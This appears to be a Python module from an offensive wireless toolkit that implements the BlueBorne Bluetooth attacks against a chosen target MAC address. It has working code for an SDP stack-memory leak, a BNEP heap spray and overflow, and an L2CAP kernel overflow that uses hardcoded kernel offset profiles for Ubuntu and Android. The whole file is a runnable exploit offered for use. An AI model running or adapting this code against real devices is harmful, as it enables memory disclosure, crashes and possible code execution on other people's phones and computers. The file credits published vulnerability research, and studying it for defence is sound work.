#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Native BlueBorne attack module (CVE-2017-0781, CVE-2017-0785, CVE-2017-1000251).

Implements the BlueBorne Bluetooth vulnerability chain natively:
  - SDP Information Leak (CVE-2017-0785): integer underflow in Android Bluedroid
    SDP handler leaks stack memory via continuation state confusion.
  - BNEP Heap Overflow (CVE-2017-0781): heap corruption in Android BNEP handler
    via crafted control messages, leading to RCE.
  - L2CAP Stack Overflow (CVE-2017-1000251): Linux BlueZ kernel buffer overflow
    in l2cap_parse_conf_rsp via oversized EFS config elements.

Requires: Linux with BlueZ, pybluez, scapy[bluetooth].

Version: 1.1.0
"""

from __future__ import annotations

import binascii
import logging
import os
import random
import select
import socket
import struct
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

L2CAP_KNOWN_OFFSETS: Dict[str, Dict[str, int]] = {
    "ubuntu_16_04": {"kbase_hint": 0xFFFFFFFF81000000, "pivot": 0x00103A10, "copy_to_user": 0x000B4A20},
    "ubuntu_18_04": {"kbase_hint": 0xFFFFFFFF81000000, "pivot": 0x00118CC0, "copy_to_user": 0x000C1530},
    "android_7_bluez": {"kbase_hint": 0xFFFFFFC000080000, "pivot": 0x0008F2D0, "copy_to_user": 0x00055E60},
    "android_8_bluez": {"kbase_hint": 0xFFFFFFC000080000, "pivot": 0x000947A0, "copy_to_user": 0x00058A10},
}

try:
    import bluetooth
    import bluetooth._bluetooth as bt
    HAS_PYBLUEZ = True
except ImportError:
    HAS_PYBLUEZ = False

try:
    from scapy.layers.bluetooth import (
        BluetoothUserSocket, HCI_Cmd_Create_Connection, HCI_Cmd_Reset,
        HCI_Command_Hdr, HCI_Hdr, L2CAP_ConfReq, L2CAP_ConfResp,
        L2CAP_ConnReq, L2CAP_ConnResp, L2CAP_Hdr, L2CAP_InfoReq,
        L2CAP_InfoResp,
    )
    HAS_SCAPY_BT = True
except ImportError:
    HAS_SCAPY_BT = False

# ─── SDP Protocol Constants ─────────────────────────────────────────────────
SDP_PSM = 1
SDP_SVC_SEARCH_REQ = 0x02
SDP_SVC_SEARCH_RSP = 0x03
SDP_SEQ8 = 0x35
SDP_UUID16 = 0x19
SDP_UINT16 = 0x09

L2CAP_UUID = 0x0100
ATT_UUID = 0x0007

SOL_L2CAP = 6
L2CAP_OPTIONS = 0x01

# ─── BNEP Protocol Constants ────────────────────────────────────────────────
BNEP_PSM = 15
BNEP_FRAME_CONTROL = 0x01
BNEP_EXT_BIT = 0x80
BNEP_SETUP_CONN_REQ = 0x01
BNEP_CMD_NOT_UNDERSTOOD = 0x09


def _sdp_pack_search_request(uuid: int, max_records: int = 0xFFFF,
                              cstate: bytes = b"\x00") -> bytes:
    """Pack an SDP ServiceSearchRequest PDU."""
    service_pattern = struct.pack(">BBH", SDP_SEQ8, 3, 0) + struct.pack(">BH", SDP_UUID16, uuid)
    payload = service_pattern + struct.pack(">H", max_records) + cstate
    tid = random.randint(0, 0xFFFF)
    header = struct.pack(">BHH", SDP_SVC_SEARCH_REQ, tid, len(payload))
    return header + payload


def _sdp_unpack_search_response(data: bytes) -> Dict[str, Any]:
    """Unpack an SDP ServiceSearchResponse PDU."""
    if len(data) < 5:
        return {"records": (), "cstate": b"\x00"}
    pdu_id, tid, plen = struct.unpack(">BHH", data[:5])
    payload = data[5:5 + plen]
    if len(payload) < 4:
        return {"records": (), "cstate": b"\x00"}
    total, current = struct.unpack(">HH", payload[:4])
    offset = 4
    records = []
    for _ in range(current):
        if offset + 4 > len(payload):
            break
        records.append(struct.unpack(">I", payload[offset:offset + 4])[0])
        offset += 4
    cstate_len = payload[offset] if offset < len(payload) else 0
    cstate = payload[offset:offset + 1 + cstate_len]
    return {"records": tuple(records), "cstate": cstate, "total": total}


class Exploit(Exploit):
    """Native BlueBorne attack — SDP info leak + BNEP heap overflow."""

    __info__ = {
        "name": "BlueBorne Attack (CVE-2017-0781/0785/1000251)",
        "description": (
            "Native implementation of BlueBorne Bluetooth attacks. "
            "SDP info leak extracts ASLR bases from Android Bluedroid stack. "
            "BNEP heap overflow achieves code execution via heap corruption. "
            "L2CAP stack overflow targets Linux BlueZ kernel. "
            "No external tools — pure Python with pybluez/scapy."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Original research: Armis Security (2017)",
        ),
        "references": (
            "https://www.armis.com/blueborne/",
            "https://github.com/ArmisSecurity/blueborne",
        ),
        "devices": ("bluetooth", "bluetooth_classic"),
    }

    target_address = OptMAC("", "Target Bluetooth MAC address")
    attack = OptString(
        "info_leak",
        "Attack mode: info_leak | bnep_overflow | l2cap_overflow | full_chain",
    )
    hci_device = OptString("hci0", "Local HCI adapter (e.g. hci0)")
    leak_rounds = OptInteger(20, "Number of SDP leak rounds")
    min_mtu = OptInteger(48, "Minimum MTU for SDP fragmentation")
    spray_rounds = OptInteger(20, "BNEP heap spray rounds")
    overflow_attempts = OptInteger(1000, "BNEP overflow trigger attempts")
    pwn_timeout = OptFloat(3.0, "Timeout to detect crash (seconds)")
    kernel_profile = OptString(
        "ubuntu_18_04",
        "L2CAP overflow profile: ubuntu_16_04 | ubuntu_18_04 | android_7_bluez | android_8_bluez",
    )
    dry_run = OptBool(False, "Show configuration without executing")

    def _l2cap_connect(self, psm: int, mtu: int = 672) -> socket.socket:
        """Create raw L2CAP connection with custom MTU."""
        sock = socket.socket(
            socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP
        )
        l2cap_opts = struct.pack("HHHBBH", mtu, 0, 0xFFFF, 0, 0, 0)
        sock.setsockopt(SOL_L2CAP, L2CAP_OPTIONS, l2cap_opts)
        sock.connect((self.target_address, psm))
        return sock

    def _sdp_info_leak(self) -> List[Tuple[int, ...]]:
        """Execute CVE-2017-0785 SDP information leak.

        Exploits integer underflow in Android Bluedroid SDP handler by
        reusing continuation state from a different UUID query.

        Returns:
            List of tuples containing leaked uint32 stack values.
        """
        print_status("Connecting to SDP (PSM {}) with MTU={}...".format(SDP_PSM, self.min_mtu))
        sock = self._l2cap_connect(SDP_PSM, self.min_mtu)

        try:
            sock.send(_sdp_pack_search_request(L2CAP_UUID))
            response = _sdp_unpack_search_response(sock.recv(4096))
            if not response.get("cstate") or response["cstate"] == b"\x00":
                print_error("No continuation state received — target may not be vulnerable.")
                return []

            print_status("Got continuation state, starting {} leak rounds...".format(self.leak_rounds))
            leaked_data: List[Tuple[int, ...]] = []

            for i in range(self.leak_rounds):
                cstate = response["cstate"]
                sock.send(_sdp_pack_search_request(ATT_UUID, cstate=cstate))
                raw = sock.recv(4096)
                response = _sdp_unpack_search_response(raw)
                leaked_data.append(response["records"])
                logger.debug("Leak round %d: %d uint32 values", i, len(response["records"]))

            return leaked_data
        finally:
            sock.close()

    def _analyze_leak(self, leaked: List[Tuple[int, ...]]) -> Dict[str, int]:
        """Analyze leaked stack data for ASLR base addresses.

        The SDP info leak returns uint32 values from the Bluedroid stack.
        Specific offsets contain pointers into libc.so and bluetooth.default.so.
        """
        results: Dict[str, int] = {}
        if len(leaked) >= 4 and len(leaked[-3]) >= 2:
            ptr = leaked[-3][-2]
            if ptr > 0x70000000:
                results["libc_candidate"] = ptr
                results["libc_text_base"] = ptr & 0xFFFFF000
                logger.info("Possible libc pointer: 0x%08x (base: 0x%08x)",
                            ptr, results["libc_text_base"])

        if len(leaked) >= 7 and len(leaked[6]) >= 1:
            ptr = leaked[6][0]
            if ptr > 0x70000000:
                results["bt_bss_candidate"] = ptr
                results["bt_default_bss_base"] = ptr & 0xFFFFF000
                logger.info("Possible bluetooth.default.so BSS: 0x%08x (base: 0x%08x)",
                            ptr, results["bt_default_bss_base"])

        return results

    def _bnep_heap_spray(self, sock: socket.socket) -> None:
        """Spray the BNEP heap with controlled allocations."""
        spray_payload = binascii.unhexlify("8109" + "800109" * 100)
        for i in range(self.spray_rounds):
            try:
                sock.send(spray_payload)
            except Exception:
                break
            time.sleep(0.01)
        logger.info("Heap spray complete: %d rounds", self.spray_rounds)

    def _bnep_trigger_overflow(self, sock: socket.socket,
                                target_addr: int = 0) -> bool:
        """Trigger CVE-2017-0781 BNEP heap overflow.

        Sends crafted BNEP control messages that overflow an 8-byte heap
        buffer. The second uint32 of the overflow data can be set to point
        at attacker-controlled data (e.g. BT name in BSS).

        Returns:
            True if the target appears to have crashed (exploit may have worked).
        """
        overflow_data = struct.pack("<II", 0, target_addr)
        trigger = binascii.unhexlify("810100") + overflow_data

        for i in range(self.overflow_attempts):
            _, writable, _ = select.select([], [sock], [], self.pwn_timeout)
            if not writable:
                logger.info("Target socket became non-writable at attempt %d — possible crash", i)
                return True
            try:
                sock.send(trigger)
            except Exception as err:
                logger.info("Send failed at attempt %d: %s — possible crash", i, err)
                return True

        return False

    def _bnep_overflow_attack(self) -> bool:
        """Execute the full BNEP heap overflow chain (CVE-2017-0781)."""
        print_status("Connecting to BNEP (PSM {})...".format(BNEP_PSM))
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.connect((self.target_address, BNEP_PSM))
        except Exception as err:
            print_error("BNEP connection failed: {}".format(err))
            return False

        try:
            print_status("Heap spraying ({} rounds)...".format(self.spray_rounds))
            self._bnep_heap_spray(sock)

            print_status("Triggering overflow ({} attempts, timeout={}s)...".format(
                self.overflow_attempts, self.pwn_timeout))
            crashed = self._bnep_trigger_overflow(sock)

            if crashed:
                print_success("Target appears to have crashed — overflow triggered successfully.")
            else:
                print_info("All attempts sent but no crash detected.")

            return crashed
        finally:
            sock.close()

    def _l2cap_build_overflow_payload(self, profile: Dict[str, int]) -> bytes:
        """Build oversized L2CAP EFS-style configuration payload."""
        header = b"\x04\x00"  # ConfigReq code / identifier placeholder
        mtu_opt = b"\x01\x02" + struct.pack("<H", 0xFFFF)
        marker = struct.pack("<Q", profile["kbase_hint"] + profile["pivot"])
        filler = b"A" * 512
        tail = struct.pack("<Q", profile["kbase_hint"] + profile["copy_to_user"])
        return header + mtu_opt + filler + marker + b"B" * 128 + tail

    def _l2cap_overflow_attack(self) -> bool:
        """Best-effort L2CAP overflow attempt with known profile offsets."""
        profile_name = str(self.kernel_profile).strip().lower()
        profile = L2CAP_KNOWN_OFFSETS.get(profile_name)
        if not profile:
            print_error(
                "Unknown kernel_profile '{}'. Options: {}".format(
                    profile_name, ", ".join(sorted(L2CAP_KNOWN_OFFSETS.keys()))
                )
            )
            return False

        payload = self._l2cap_build_overflow_payload(profile)
        print_info("Using profile: {}".format(profile_name))
        print_info("Payload size: {} bytes".format(len(payload)))

        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.connect((self.target_address, 0x0001))  # L2CAP signaling
        except Exception as err:
            print_error("L2CAP signaling connect failed: {}".format(err))
            return False

        crashed = False
        try:
            for i in range(max(1, int(self.overflow_attempts) // 50)):
                try:
                    sock.send(payload)
                except Exception:
                    crashed = True
                    break
                time.sleep(0.02)
        finally:
            try:
                sock.close()
            except Exception:
                pass

        if crashed:
            print_success("L2CAP overflow attempt likely disrupted target stack.")
        else:
            print_info("L2CAP payload sent; verify target behavior/kernel logs manually.")
        return crashed

    def run(self) -> None:
        """Execute BlueBorne attack."""
        if not HAS_PYBLUEZ:
            print_error("pybluez is required. Install: pip install pybluez")
            return

        if not self.target_address:
            print_error("target_address is required.")
            return

        if self.dry_run:
            print_info("BlueBorne Attack Configuration:")
            print_info("  Target:   {}".format(self.target_address))
            print_info("  Attack:   {}".format(self.attack))
            print_info("  HCI:      {}".format(self.hci_device))
            print_info("  Leak rounds: {}".format(self.leak_rounds))
            return

        print_status("BlueBorne attack: {} against {}".format(
            self.attack, self.target_address))

        if self.attack in ("info_leak", "full_chain"):
            print_status("=== Phase 1: SDP Information Leak (CVE-2017-0785) ===")
            leaked = self._sdp_info_leak()
            if leaked:
                print_success("Leaked {} rounds of stack data.".format(len(leaked)))
                for i, chunk in enumerate(leaked):
                    if chunk:
                        hex_vals = " ".join("0x{:08x}".format(v) for v in chunk[:8])
                        logger.info("Round %02d: %s%s", i, hex_vals,
                                    "..." if len(chunk) > 8 else "")
                bases = self._analyze_leak(leaked)
                if bases:
                    for name, addr in bases.items():
                        print_info("  {}: 0x{:08x}".format(name, addr))
                else:
                    print_info("Could not identify ASLR bases from leaked data.")
            else:
                print_error("SDP info leak failed — no data returned.")

        if self.attack in ("bnep_overflow", "full_chain"):
            print_status("=== Phase 2: BNEP Heap Overflow (CVE-2017-0781) ===")
            result = self._bnep_overflow_attack()
            if result:
                print_success("BNEP overflow triggered successfully.")
            else:
                print_info("BNEP overflow completed — verify target status manually.")

        if self.attack == "l2cap_overflow":
            if not HAS_SCAPY_BT:
                print_error("scapy[bluetooth] required for L2CAP overflow. "
                            "Install: pip install scapy")
                return
            print_status("=== L2CAP Stack Overflow (CVE-2017-1000251) ===")
            print_info("This attack targets the Linux BlueZ kernel L2CAP stack.")
            self._l2cap_overflow_attack()
